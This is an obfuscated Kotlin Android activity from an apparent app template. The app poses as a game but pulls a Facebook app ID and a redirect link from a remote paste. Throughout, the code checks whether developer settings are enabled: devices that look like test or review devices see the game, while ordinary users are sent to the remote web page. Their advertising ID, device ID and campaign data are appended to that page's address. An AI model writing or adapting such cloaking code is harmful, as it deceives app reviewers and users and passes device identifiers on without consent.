package com.example.template.adbSets

import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.content.Intent
import android.provider.Settings
import com.android.volley.Request
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.example.template.MainActivity
import com.example.template.R
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsLogger
import com.google.gson.Gson
import com.onesignal.OneSignal
import com.orhanobut.hawk.Hawk
import eu.amirs.JSON
import io.michaelrocks.paranoid.Obfuscate
import kotlinx.coroutines.*
import java.lang.Exception
import java.util.ArrayList
import kotlin.coroutines.CoroutineContext


@Obfuscate
class TemplateMainLogic : AppCompatActivity(), CoroutineScope {
    private val job = SupervisorJob()
    private val ioScope by lazy { CoroutineScope(job + Dispatchers.Main) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_beat_loading)
        supportActionBar?.hide()
        if (Hawk.contains("result")) {
            mainChecking()
        } else {
            secondNetworkChecking()
        }
    }

    private fun secondNetworkChecking() {
        ioScope.launch {
            withContext(Dispatchers.Main) {
                withContext(Dispatchers.Main) {
                    try {
                        val queue = Volley.newRequestQueue(this@TemplateMainLogic)
                        val url = "https://rentry.co/58tb2/raw"
                        val stringRequest = StringRequest(
                            Request.Method.GET, url,
                            { success ->
                                val loads: JSON = JSON(success)
                                val gson = Gson()
                                Log.d("testOlolo: ", loads.jsonObject["fb"].toString())
                                FacebookSdk.setApplicationId(loads.jsonObject["fb"].toString())
                                FacebookSdk.setAdvertiserIDCollectionEnabled(true)
                                FacebookSdk.sdkInitialize(this@TemplateMainLogic)
                                FacebookSdk.fullyInitialize()
                                AppEventsLogger.activateApp(this@TemplateMainLogic)

                                ioScope.launch {
                                    withContext(Dispatchers.Main) {
                                        val devSets = Settings.Secure.getInt(
                                            this@TemplateMainLogic.contentResolver,
                                            "development_settings_enabled",
                                            0
                                        )
                                        val templateDeepTools = TemplateDeepTools()
                                        templateDeepTools.engine(this@TemplateMainLogic)
                                        templateDeepTools.test.observe(this@TemplateMainLogic) { data ->
                                            val frozenAf = TemplateAf(this@TemplateMainLogic)
                                            launchApps(this@TemplateMainLogic, frozenAf)
                                            frozenAf.adId.observe(this@TemplateMainLogic) { ads ->
                                                frozenAf.test.observe(this@TemplateMainLogic) { campaign ->
                                                    funcOne(campaign)

                                                    if (data[0][0][0][0].isNotEmpty()) {
                                                        if (campaign[0][0][0][0].isNotEmpty()) {
                                                            funcTwo(campaign, loads, data, ads)
                                                        } else {
                                                            if (campaign[0][0][0][1].isNotEmpty()) {
                                                                funcThree(campaign, loads, data, ads, devSets)
                                                            } else {
                                                                funcFour(campaign, loads, data, ads, devSets)
                                                            }
                                                        }
                                                    } else {
                                                        funcBig(campaign, loads, data, ads, devSets)
                                                    }
                                                }
                                            }

                                        }
                                    }
                                }
                            }, { error ->
                                Log.d("testOlolo: ", error.message.toString())
                            })
                        queue.add(stringRequest)


                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }
            }

        }
    }

    private fun funcBig(
        campaign: List<Array<ArrayList<List<String>>>>,
        loads: JSON,
        data: List<Array<ArrayList<List<String>>>>,
        ads: List<Array<ArrayList<List<String>>>>,
        devSets: Int
    ) {
        if (campaign[0][0][0][0].isNotEmpty()) {
            val url =
                "${loads.jsonObject["link"]}?sub_id_1=${campaign[0][0][0][0]}&ad_id=${ads[0][0][0][0]}&deviceID=${ads[0][0][0][1]}"
            Hawk.put("result", url)
            startActivity(
                Intent(
                    this@TemplateMainLogic,
                    TemplateWebPage::class.java
                )
            )
            finish()
        } else {
            if (devSets == 0) {
                val url =
                    "${loads.jsonObject["link"]}?ad_id=${ads[0][0][0][0]}&deviceID=${ads[0][0][0][1]}"
                Hawk.put("result", url)
                startActivity(
                    Intent(
                        this@TemplateMainLogic,
                        TemplateWebPage::class.java
                    )
                )
                finish()
            } else {
                Hawk.put("result", "game")
                startActivity(
                    Intent(
                        this@TemplateMainLogic,
                        MainActivity::class.java
                    )
                )
                finish()

            }
        }
    }

    private fun funcFour(
        campaign: List<Array<ArrayList<List<String>>>>,
        loads: JSON,
        data: List<Array<ArrayList<List<String>>>>,
        ads: List<Array<ArrayList<List<String>>>>,
        devSets: Int
    ) {
        val url =
            "${loads.jsonObject["link"]}?sub_id_1=${data[0][0][0][0]}&ad_id=${ads[0][0][0][0]}&deviceID=${ads[0][0][0][1]}&settings=$devSets"
        Hawk.put("result", url)
        startActivity(
            Intent(
                this@TemplateMainLogic,
                TemplateWebPage::class.java
            )
        )
        finish()
    }

    private fun funcThree(
        campaign: List<Array<ArrayList<List<String>>>>,
        loads: JSON,
        data: List<Array<ArrayList<List<String>>>>,
        ads: List<Array<ArrayList<List<String>>>>,
        devSets: Int
    ) {
        val url =
            "${loads.jsonObject["link"]}?sub_id_1=${data[0][0][0][0]}&ad_id=${ads[0][0][0][0]}&deviceID=${ads[0][0][0][1]}&settings=$devSets&m_source=${campaign[0][0][0][1]}"
        Hawk.put("result", url)
        startActivity(
            Intent(
                this@TemplateMainLogic,
                TemplateWebPage::class.java
            )
        )
        finish()
    }

    private fun funcTwo(
        campaign: List<Array<ArrayList<List<String>>>>,
        loads: JSON,
        data: List<Array<ArrayList<List<String>>>>,
        ads: List<Array<ArrayList<List<String>>>>
    ) {
        val url =
            "${loads.jsonObject["link"]}?sub_id_1=${data[0][0][0][0]}&ad_id=${ads[0][0][0][0]}&deviceID=${ads[0][0][0][1]}"
        Hawk.put("result", url)
        startActivity(
            Intent(
                this@TemplateMainLogic,
                TemplateWebPage::class.java
            )
        )
        finish()
    }

    private fun funcOne(campaign: List<Array<ArrayList<List<String>>>>) {
        if (campaign[0][0][0][0].isNotEmpty()) {
            val table =
                if (campaign[0][0][0][0].contains("&push=")) campaign[0][0][0][0].substringAfter(
                    "&push="
                ).substringBefore("&") else ""
            if (table.isNotEmpty()) {
                OneSignal.sendTag("sub_app", table)
            }
        }
    }

    private fun mainChecking() {
        if (Hawk.get<String>("result") == "game") {
            startActivity(
                Intent(
                    this@TemplateMainLogic,
                    MainActivity::class.java
                )
            )
            finish()
        } else {
            startActivity(
                Intent(
                    this@TemplateMainLogic,
                    TemplateWebPage::class.java
                )
            )
            finish()
        }
    }

    override val coroutineContext: CoroutineContext
        get() = job + Dispatchers.IO

}